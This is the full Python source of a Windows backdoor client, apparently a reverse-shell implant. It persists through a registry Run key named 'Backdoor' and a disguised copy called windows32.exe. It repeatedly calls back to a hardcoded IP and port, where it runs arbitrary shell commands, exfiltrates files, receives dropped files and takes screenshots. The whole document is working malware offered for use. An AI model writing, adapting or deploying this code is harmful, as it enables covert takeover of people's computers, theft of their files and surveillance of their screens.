# Client
import ctypes
import socket
import sys
import shutil
import subprocess
import os
import time
from PIL import ImageGrab
import tempfile

def initiate():
    registry()
    tune_connection()

def registry():
    location = os.environ['appdata']+'\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+ location + '"', shell=True)

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        f.close()
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def tune_connection():
    #Tries to connect to server every 20 seconds
    s = socket.socket()
    while True:
        time.sleep(20)
        try:
            s.connect(("192.168.182.128", 8080))
            shell(s)

        except:
            tune_connection()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def letGrab(s, path):
    if os.path.exists(path):
        with open(path, 'rb') as f:
            packet = f.read(1024)
            while len(packet) > 0:
                s.send(packet)
                packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def letSend(s, path, fileName):
    try:
        os.makedirs(path, exist_ok=True) #Ensure path exists
        full_path = os.path.join(path, fileName)
        with open(full_path, 'ab') as f:
            while True:
                bits = s.recv(1024)
                if bits.endswith(b"DONE"):
                    f.write(bits[:-4])
                    break
                if b"File not found" in bits or b"File is empty" in bits:
                    print("[-] Server couldn't send file.")
                    break
                f.write(bits)
        print(f"[+] File received and saved as: {full_path}")
    except Exception as e:
        print(f"[-]Error receiving file: {str(e)}")

def shell(s):
    while True:
        command = s.recv(1024).decode()
        if 'terminate' in command:
            try:
                s.close()
                break
            except Exception as e:
                s.send(f"[+] Some error occurred: {str(e)}".encode())
                break

        elif command == "checkPrivilege":
            if is_admin():
                s.send(b"[+] Running with Admin Privileges\n")
            else:
                s.send(b"[-] User privileges. (No Admin Privileges)\n")

        # command format: grab*<filepath>

        elif command.startswith("grab"):
            parts = command.split("*")
            if len(parts) < 2:
                s.send(b"[-] Invalid grab command format")
                continue
            command, path = parts
            letGrab(s, path)

        elif command.startswith("send"):
            send, path,fileName = command.split("*")
            try:
                letSend(s, path, fileName)
            except Exception as e:
                informToServer = ("[-] some error Occured." + str(e))
                s.send(informToServer.encode())

        elif 'cd' in command:
            try:
                code, directory = command.split(" ",1)
                os.chdir(directory)
                inform_to_server = "[+] Current working directory is " + os.getcwd()
                s.send(inform_to_server.encode())
            except Exception as e:
                s.send(f"[+] Some error occurred: {str(e)}".encode())

        elif 'screenCap' in command:
            # Create a temp dir to store our screenshot file
            # Sample Dirpath: C:\users\user\appdata\local\temp\tmp8dfj57ox
            dirpath = tempfile.mkdtemp()
            # save() method saves the snapshot in the temp dir
            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
            transfer(s, dirpath + "\img.jpg")  # transfer to the server using our transfer function
            shutil.rmtree(dirpath)  # delete the temp directory using shutil remove tree

        else:
            CMD = subprocess.Popen(command, shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            # send back the result
            s.send(CMD.stdout.read())
            # send back the error -if any-, such as syntax error
            s.send(CMD.stderr.read())

def main():
    initiate()
if __name__ == '__main__':
    main()